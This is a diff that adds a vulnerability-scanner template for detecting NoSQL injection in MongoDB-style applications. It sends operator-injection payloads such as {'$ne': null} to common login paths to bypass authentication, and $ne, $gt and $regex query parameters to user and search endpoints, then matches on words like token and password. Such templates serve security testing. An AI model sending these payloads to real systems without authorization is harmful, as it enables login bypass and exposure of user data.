@@ -1,0 +1,55 @@
+id: nosql-injection
+
+info:
+  name: NoSQL Injection
+  author: Kalkaneus Team
+  severity: high
+  description: Detects NoSQL injection vulnerabilities in MongoDB and similar databases
+  reference:
+    - https://owasp.org/www-community/attacks/NoSQL_Injection
+  tags: nosql,injection,mongodb,database
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}/api/login"
+      - "{{BaseURL}}/auth/login"
+      - "{{BaseURL}}/user/login"
+    
+    headers:
+      Content-Type: application/json
+    
+    body: |
+      {"username": {"$ne": null}, "password": {"$ne": null}}
+    
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "success"
+          - "token"
+          - "authenticated"
+          - "dashboard"
+          - "welcome"
+        condition: or
+        
+      - type: status
+        status:
+          - 200
+          - 302
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/users?id[$ne]=0"
+      - "{{BaseURL}}/api/user?id[$gt]="
+      - "{{BaseURL}}/search?q[$regex]=.*"
+    
+    matchers:
+      - type: word
+        words:
+          - "users"
+          - "email"
+          - "password"
+          - "admin"
+        condition: or
